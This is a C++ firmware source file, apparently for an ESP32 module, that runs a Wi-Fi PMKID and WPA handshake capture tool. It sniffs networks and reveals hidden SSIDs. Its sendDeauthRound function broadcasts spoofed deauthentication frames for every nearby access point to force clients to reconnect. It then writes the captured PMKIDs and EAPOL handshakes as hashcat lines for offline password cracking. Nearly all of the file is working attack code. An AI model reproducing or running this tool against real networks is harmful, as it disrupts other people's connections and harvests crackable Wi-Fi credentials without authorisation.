#include "ep_app_pmkid.hpp"
#include "pp_commands.hpp"
#include "esp_log.h"
#include <cstdio>

static const char* TAG = "pmkid";

EPAppPmkid* EPAppPmkid::instance = nullptr;
hs_disp_t EPAppPmkid::disp[EP_MAX_HS] = {};
char EPAppPmkid::hcLine[EP_MAX_HS][EP_HC_LINE_MAX] = {};
uint16_t EPAppPmkid::hcLen[EP_MAX_HS] = {};
volatile uint16_t EPAppPmkid::hsCount = 0;
volatile uint16_t EPAppPmkid::eapolSeen = 0;
volatile uint16_t EPAppPmkid::beaconCount = 0;
volatile uint16_t EPAppPmkid::m1Seen = 0;
volatile uint16_t EPAppPmkid::m2Seen = 0;
volatile uint16_t EPAppPmkid::pairedSeen = 0;
volatile uint16_t EPAppPmkid::deauthSent = 0;
EPAppPmkid::beacon_t EPAppPmkid::beacons[EP_MAX_BEACONS] = {};
EPAppPmkid::pending_t EPAppPmkid::pend[EP_MAX_PENDING] = {};
uint8_t EPAppPmkid::pendNext = 0;

static const char* HEXC = "0123456789abcdef";
// Append hex of n bytes to dst at *pos (bounded by max). Returns false if full.
static bool apphex(char* dst, int& pos, int max, const uint8_t* b, int n) {
    if (pos + n * 2 >= max) return false;
    for (int i = 0; i < n; i++) {
        dst[pos++] = HEXC[b[i] >> 4];
        dst[pos++] = HEXC[b[i] & 0x0F];
    }
    return true;
}
static bool appstr(char* dst, int& pos, int max, const char* s) {
    while (*s) {
        if (pos + 1 >= max) return false;
        dst[pos++] = *s++;
    }
    return true;
}

EPAppPmkid::EPAppPmkid() {
    instance = this;
    hsCount = 0;
    beaconCount = 0;
    eapolSeen = 0;
    pendNext = 0;
    memset(pend, 0, sizeof(pend));
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&EPAppPmkid::rxCb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(curChannel, WIFI_SECOND_CHAN_NONE);
    ESP_LOGI(TAG, "PMKID/handshake sniffer created");
}

EPAppPmkid::~EPAppPmkid() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    instance = nullptr;
}

void EPAppPmkid::noteBeacon(const uint8_t* bssid, const char* ssid, uint8_t channel) {
    for (uint16_t i = 0; i < beaconCount; i++)
        if (memcmp(beacons[i].bssid, bssid, 6) == 0) {
            beacons[i].channel = channel;  // keep channel fresh
            if (ssid[0] && beacons[i].ssid[0] == 0) {
                strncpy(beacons[i].ssid, ssid, 31);
                beacons[i].ssid[31] = 0;
            }
            return;
        }
    if (beaconCount >= EP_MAX_BEACONS) return;
    memcpy(beacons[beaconCount].bssid, bssid, 6);
    strncpy(beacons[beaconCount].ssid, ssid, 31);
    beacons[beaconCount].ssid[31] = 0;
    beacons[beaconCount].channel = channel;
    beaconCount = beaconCount + 1;
}

// Send one deauth round: broadcast deauth spoofing every AP heard on the current
// channel, so their clients drop and reconnect (fresh handshake to capture).
void EPAppPmkid::sendDeauthRound() {
    uint8_t frame[26] = {
        0xC0, 0x00,                          // FC: deauthentication
        0x00, 0x00,                          // duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // addr1 = all clients (broadcast)
        0, 0, 0, 0, 0, 0,                    // addr2 = AP BSSID (spoofed)
        0, 0, 0, 0, 0, 0,                    // addr3 = BSSID
        0x00, 0x00,                          // seq
        0x07, 0x00                           // reason 7: class-3 frame from nonassoc STA
    };
    for (uint16_t i = 0; i < beaconCount; i++) {
        if (beacons[i].channel != curChannel) continue;
        memcpy(frame + 10, beacons[i].bssid, 6);
        memcpy(frame + 16, beacons[i].bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
        deauthSent = deauthSent + 1;
    }
}

void EPAppPmkid::resolveSsid(const uint8_t* bssid, char* out) {
    out[0] = 0;
    for (uint16_t i = 0; i < beaconCount; i++)
        if (memcmp(beacons[i].bssid, bssid, 6) == 0) {
            strncpy(out, beacons[i].ssid, 31);
            out[31] = 0;
            return;
        }
}

bool EPAppPmkid::havePair(const uint8_t* ap, const uint8_t* sta, uint8_t type) {
    for (uint16_t i = 0; i < hsCount; i++)
        if (disp[i].type == type && memcmp(disp[i].ap, ap, 6) == 0 && memcmp(disp[i].sta, sta, 6) == 0)
            return true;
    return false;
}

void EPAppPmkid::addPmkid(const uint8_t* ap, const uint8_t* sta, const uint8_t* pmkid, uint8_t ch) {
    if (hsCount >= EP_MAX_HS || havePair(ap, sta, 1)) return;
    char ssid[32];
    resolveSsid(ap, ssid);
    int i = hsCount;
    memcpy(disp[i].ap, ap, 6);
    memcpy(disp[i].sta, sta, 6);
    strncpy(disp[i].ssid, ssid, 31);
    disp[i].ssid[31] = 0;
    disp[i].type = 1;
    disp[i].channel = ch;
    // WPA*01*pmkid*ap*sta*essid***
    int pos = 0;
    char* L = hcLine[i];
    appstr(L, pos, EP_HC_LINE_MAX, "WPA*01*");
    apphex(L, pos, EP_HC_LINE_MAX, pmkid, 16);
    appstr(L, pos, EP_HC_LINE_MAX, "*");
    apphex(L, pos, EP_HC_LINE_MAX, ap, 6);
    appstr(L, pos, EP_HC_LINE_MAX, "*");
    apphex(L, pos, EP_HC_LINE_MAX, sta, 6);
    appstr(L, pos, EP_HC_LINE_MAX, "*");
    apphex(L, pos, EP_HC_LINE_MAX, (const uint8_t*)ssid, (int)strlen(ssid));
    appstr(L, pos, EP_HC_LINE_MAX, "***");
    hcLen[i] = pos;
    hsCount = hsCount + 1;
    ESP_LOGI(TAG, "PMKID captured (%u)", (unsigned)hsCount);
}

void EPAppPmkid::addHandshake(const uint8_t* ap, const uint8_t* sta, const uint8_t* anonce,
                              const uint8_t* mic, const uint8_t* eapol, int eapolLen, uint8_t ch) {
    if (hsCount >= EP_MAX_HS || havePair(ap, sta, 2)) return;
    if (eapolLen < 95 || eapolLen > 256) return;
    char ssid[32];
    resolveSsid(ap, ssid);  // may be empty (unknown SSID); store anyway
    int i = hsCount;
    memcpy(disp[i].ap, ap, 6);
    memcpy(disp[i].sta, sta, 6);
    strncpy(disp[i].ssid, ssid, 31);
    disp[i].ssid[31] = 0;
    disp[i].type = 2;
    disp[i].channel = ch;

    // Copy the M2 EAPOL frame and zero its MIC field (offset 4 hdr + 77) for hashcat.
    uint8_t buf[256];
    memcpy(buf, eapol, eapolLen);
    if (4 + 77 + 16 <= eapolLen) memset(buf + 4 + 77, 0, 16);

    // WPA*02*mic*ap*sta*essid*anonce*eapol*messagepair
    int pos = 0;
    char* L = hcLine[i];
    appstr(L, pos, EP_HC_LINE_MAX, "WPA*02*");
    apphex(L, pos, EP_HC_LINE_MAX, mic, 16);
    appstr(L, pos, EP_HC_LINE_MAX, "*");
    apphex(L, pos, EP_HC_LINE_MAX, ap, 6);
    appstr(L, pos, EP_HC_LINE_MAX, "*");
    apphex(L, pos, EP_HC_LINE_MAX, sta, 6);
    appstr(L, pos, EP_HC_LINE_MAX, "*");
    apphex(L, pos, EP_HC_LINE_MAX, (const uint8_t*)ssid, (int)strlen(ssid));
    appstr(L, pos, EP_HC_LINE_MAX, "*");
    apphex(L, pos, EP_HC_LINE_MAX, anonce, 32);
    appstr(L, pos, EP_HC_LINE_MAX, "*");
    if (!apphex(L, pos, EP_HC_LINE_MAX, buf, eapolLen)) return;  // too long, drop
    appstr(L, pos, EP_HC_LINE_MAX, "*00");
    hcLen[i] = pos;
    hsCount = hsCount + 1;
    ESP_LOGI(TAG, "handshake captured (%u)", (unsigned)hsCount);
}

// Map BSSID -> SSID from any mgmt frame that carries an SSID element. Assoc /
// reassoc requests carry the real SSID even for HIDDEN networks (beacons don't).
void EPAppPmkid::handleMgmt(const wifi_promiscuous_pkt_t* pkt) {
    const uint8_t* p = pkt->payload;
    int fixed;
    switch (p[0]) {
        case 0x80: fixed = 12; break;  // beacon (ts8, interval2, cap2)
        case 0x50: fixed = 12; break;  // probe response
        case 0x00: fixed = 4;  break;  // assoc request (cap2, listen2)
        case 0x20: fixed = 10; break;  // reassoc request (cap2, listen2, currentAP6)
        default: return;
    }
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24 + fixed + 2) return;
    const uint8_t* bssid = p + 16;  // addr3 = BSSID
    const uint8_t* tags = p + 24 + fixed;
    int remain = len - (24 + fixed) - 4;  // minus FCS
    char ssid[32] = {0};
    while (remain >= 2) {
        uint8_t tag = tags[0], tlen = tags[1];
        if (2 + tlen > remain) break;
        if (tag == 0) {
            uint8_t n = tlen > 31 ? 31 : tlen;
            memcpy(ssid, tags + 2, n);
            ssid[n] = 0;
            break;
        }
        tags += 2 + tlen;
        remain -= 2 + tlen;
    }
    noteBeacon(bssid, ssid, pkt->rx_ctrl.channel);  // assoc req fills a hidden SSID
}

void EPAppPmkid::handleData(const wifi_promiscuous_pkt_t* pkt) {
    const uint8_t* p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t fc0 = p[0];
    uint8_t subtype = (fc0 >> 4) & 0x0F;
    int hdr = 24 + ((subtype & 0x08) ? 2 : 0);  // QoS data adds 2
    if (len < hdr + 8 + 4) return;

    const uint8_t* llc = p + hdr;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 && llc[6] == 0x88 && llc[7] == 0x8E)) return;

    const uint8_t* eapol = llc + 8;
    int eapolMax = len - (int)(eapol - p);
    if (eapolMax < 4) return;
    if (eapol[1] != 0x03) return;  // EAPOL-Key
    eapolSeen = eapolSeen + 1;
    if (eapolMax < 99) return;  // need the fixed key descriptor

    const uint8_t* kd = eapol + 4;
    uint16_t keyinfo = (kd[1] << 8) | kd[2];
    bool pairwise = keyinfo & 0x0008;
    bool ack = keyinfo & 0x0080;
    bool mic = keyinfo & 0x0100;
    bool secure = keyinfo & 0x0200;
    if (!pairwise) return;

    int kdlen = (kd[93] << 8) | kd[94];
    const uint8_t* keydata = kd + 95;
    int avail = eapolMax - 4 - 95;
    if (kdlen > avail) kdlen = avail;
    if (kdlen < 0) kdlen = 0;

    const uint8_t* anonce = kd + 13;
    const uint8_t* replay = kd + 5;

    // M1 (AP->STA): ACK, no MIC, not secure. addr2=AP, addr1=STA.
    if (ack && !mic && !secure) {
        m1Seen = m1Seen + 1;
        const uint8_t* ap = p + 10;
        const uint8_t* sta = p + 4;
        // stash M1 for the handshake pairing
        pending_t& e = pend[pendNext];
        memcpy(e.ap, ap, 6);
        memcpy(e.sta, sta, 6);
        memcpy(e.anonce, anonce, 32);
        memcpy(e.replay, replay, 8);
        e.used = true;
        pendNext = (pendNext + 1) % EP_MAX_PENDING;

        // opportunistic PMKID (type 01) if the KDE is present
        for (int i = 0; i + 22 <= kdlen; i++) {
            if (keydata[i] == 0xDD && keydata[i + 2] == 0x00 && keydata[i + 3] == 0x0F &&
                keydata[i + 4] == 0xAC && keydata[i + 5] == 0x04) {
                const uint8_t* pmkid = keydata + i + 6;
                bool nz = false;
                for (int k = 0; k < 16; k++)
                    if (pmkid[k]) { nz = true; break; }
                if (nz) addPmkid(ap, sta, pmkid, pkt->rx_ctrl.channel);
                break;
            }
        }
        return;
    }

    // M2 (STA->AP): MIC, no ACK, not secure. addr1=AP, addr2=STA.
    if (mic && !ack && !secure) {
        m2Seen = m2Seen + 1;
        const uint8_t* ap = p + 4;
        const uint8_t* sta = p + 10;
        const uint8_t* micv = kd + 77;
        int eapolLen = 4 + 95 + kdlen;  // whole EAPOL-Key frame
        if (eapolLen > eapolMax) eapolLen = eapolMax;
        // find the matching M1 (same AP+STA, same replay counter)
        for (int j = 0; j < EP_MAX_PENDING; j++) {
            if (!pend[j].used) continue;
            if (memcmp(pend[j].ap, ap, 6) == 0 && memcmp(pend[j].sta, sta, 6) == 0 &&
                memcmp(pend[j].replay, replay, 8) == 0) {
                pairedSeen = pairedSeen + 1;
                addHandshake(ap, sta, pend[j].anonce, micv, eapol, eapolLen, pkt->rx_ctrl.channel);
                pend[j].used = false;
                return;
            }
        }
        return;
    }
}

void EPAppPmkid::rxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (instance == nullptr || !instance->capturing) return;
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (type == WIFI_PKT_MGMT)
        instance->handleMgmt(pkt);
    else if (type == WIFI_PKT_DATA)
        instance->handleData(pkt);
}

void EPAppPmkid::Loop(uint32_t currentMillis) {
    if (!capturing) return;
    if (deauthRounds > 0) {
        deauthRounds--;
        sendDeauthRound();
    }
    if (lockChannel >= 1 && lockChannel <= 13) {
        if (curChannel != lockChannel) {
            curChannel = lockChannel;
            esp_wifi_set_channel(curChannel, WIFI_SECOND_CHAN_NONE);
        }
        return;
    }
    if (currentMillis - lastHopMs > kHopIntervalMs) {
        lastHopMs = currentMillis;
        curChannel++;
        if (curChannel > 13) curChannel = 1;
        esp_wifi_set_channel(curChannel, WIFI_SECOND_CHAN_NONE);
    }
}

// IRQ CALLBACK
bool EPAppPmkid::OnPPData(uint16_t command, std::vector<uint8_t>& data) {
    if (command == PPCMD_PMKID_GET_ENTRY) {
        if (data.size() >= 2) reqIdx = *reinterpret_cast<uint16_t*>(data.data());
        return true;
    } else if (command == PPCMD_PMKID_SET_AUTO) {
        if (data.size() >= 1) capturing = (data[0] != 0);
        return true;
    } else if (command == PPCMD_PMKID_CLEAR) {
        hsCount = 0;
        return true;
    } else if (command == PPCMD_PMKID_SET_CHANNEL) {
        if (data.size() >= 1 && data[0] <= 13) lockChannel = data[0];
        return true;
    } else if (command == PPCMD_PMKID_SET_LINEPOS) {
        if (data.size() >= 4) {
            reqLineIdx = data[0] | (data[1] << 8);
            reqLineOff = data[2] | (data[3] << 8);
        }
        return true;
    } else if (command == PPCMD_PMKID_DEAUTH) {
        deauthRounds = 8;  // queue a burst; Loop() sends it on the current channel
        return true;
    }
    return false;
}

// IRQ CALLBACK (reads fixed buffers only)
bool EPAppPmkid::OnPPReqData(uint16_t command, std::vector<uint8_t>& data) {
    if (command == PPCMD_APPMGR_APPCMD) {
        data.resize(14);
        uint16_t* p = reinterpret_cast<uint16_t*>(data.data());
        p[0] = hsCount;
        p[1] = capturing ? 1 : 0;
        p[2] = eapolSeen;
        p[3] = beaconCount;
        p[4] = m1Seen;
        p[5] = m2Seen;
        p[6] = pairedSeen;
        return true;
    } else if (command == PPCMD_PMKID_GET_ENTRY) {
        data.resize(sizeof(hs_disp_t));
        memset(data.data(), 0, sizeof(hs_disp_t));
        if (reqIdx < hsCount) memcpy(data.data(), &disp[reqIdx], sizeof(hs_disp_t));
        return true;
    } else if (command == PPCMD_PMKID_GET_LINELEN) {
        data.resize(2);
        uint16_t l = (reqLineIdx < hsCount) ? hcLen[reqLineIdx] : 0;
        data[0] = l & 0xFF;
        data[1] = l >> 8;
        return true;
    } else if (command == PPCMD_PMKID_GET_LINECHUNK) {
        // up to 96 bytes of hcLine[reqLineIdx] from reqLineOff
        int n = 0;
        if (reqLineIdx < hsCount) {
            int total = hcLen[reqLineIdx];
            n = total - reqLineOff;
            if (n < 0) n = 0;
            if (n > 96) n = 96;
        }
        data.resize(n);
        if (n > 0) memcpy(data.data(), hcLine[reqLineIdx] + reqLineOff, n);
        return true;
    }
    return false;
}
